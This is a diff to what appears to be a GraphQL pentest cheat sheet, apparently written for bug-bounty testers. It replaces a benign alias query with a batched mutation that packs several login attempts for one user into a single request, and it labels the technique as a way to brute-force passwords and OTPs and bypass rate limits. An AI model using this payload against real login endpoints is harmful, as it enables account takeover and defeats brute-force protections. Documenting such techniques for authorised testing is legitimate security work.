@@ -76,7 +76,7 @@ mutation {
 ```
 
 ```json
-{"query": "query { qname: Query { field1 } qname1: Query { field1 } }"}
+{"query": "mutation { one: login(username:\"bob\",pass:1111) two: login(username:\"bob\",pass:2222) three: login(username:\"bob\",pass:3333) }"}
 ```
 
 **When-to-use**: password/OTP brute force and rate-limit bypass — one HTTP request = N attempts. (Throttle per program rules; this is a volumetric technique.)
